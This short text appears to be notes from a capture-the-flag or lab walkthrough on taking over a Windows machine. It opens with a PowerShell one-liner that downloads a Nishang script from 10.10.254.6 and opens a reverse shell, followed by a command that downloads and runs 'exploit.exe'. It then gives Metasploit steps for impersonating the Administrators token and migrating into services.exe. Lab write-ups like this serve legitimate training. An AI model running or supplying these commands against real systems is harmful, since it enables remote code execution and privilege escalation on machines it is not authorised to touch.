powershell iex (New-Object Net.WebClient).DownloadString(â€˜http://10.10.254.6:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IpAddress 10.10.254.6 -Port 4447

https://github.com/samratashok/nishang.git


powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.254.6:8080/exploit.exe','exploit.exe')"

Start-Process "exploit.exe"


View all the privileges using whoami /priv

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
